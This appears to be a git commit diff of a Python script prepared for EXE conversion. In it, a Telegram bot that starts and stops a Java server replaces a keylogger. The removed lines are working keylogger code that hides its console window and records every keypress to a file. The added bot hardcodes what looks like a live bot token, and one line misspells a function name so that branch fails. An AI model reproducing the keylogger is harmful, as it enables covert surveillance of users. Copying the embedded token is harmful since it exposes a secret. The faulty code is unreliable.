3b3d5ccdc71f62092ecb764b91b9c522a31f84de
eroge-69 <erogexunamed@gmail.com>
2025-09-16 02:10:45 +0700

    Upload main.py via PY to EXE tool

--- python-files/main.py
+++ python-files/main.py
@@ -1,22 +1,31 @@
 import os
-import sys
-from pynput import keyboard
+import telebot
 
-if __name__ == "__main__":
-    # Hide console window if running as .exe
-    if sys.platform == "win32":
-        import ctypes
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+# os.startfile("C:\Users\Mserv\Downloads\AnyDesk.exe")
 
-    def write_to_file(text):
-        file_path = os.path.join(os.path.dirname(__file__), "output.txt")
-        with open(file_path, "a") as f:
-            f.write(text + "\n")
+bot = telebot.TeleBot("8050293718:AAGmspDLY7leFlagCkic4k3Ka5tpydhvuKY")
 
-    write_to_file('program running')
+bot.remove_webhook()
 
-    def on_press(key):
-        write_to_file(f'key {key} pressed')
+@bot.message_handler(commands=["start"])
+def start(message):
+    keyboard = telebot.types.ReplyKeyboardMarkup(row_width=2,resize_keyboard=True,one_time_keyboard=False)
 
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+    btn1 = telebot.types.KeyboardButton("запустить")
+    btn2 = telebot.types.KeyboardButton("остановить")
+
+    keyboard.add(btn1,btn2)
+
+    bot.send_message(message.chat.id,"Выбери действие",reply_markup=keyboard)
+
+@bot.message_handler(content_types=['text'])
+def getmessages(message):
+
+    if message.text == "запустить":
+        bot.send_message(message.from_user.id,"сервер запускается ожидайте")
+        os.stsrtfile(r"C:\Users\Mserv\Desktop\Новая папка\run.bat")
+    elif message.text == "остановить":
+        bot.send_message(message.from_user.id, "сервер останавливается")
+        os.system('taskkill /F /IM java.exe')
+
+bot.polling()
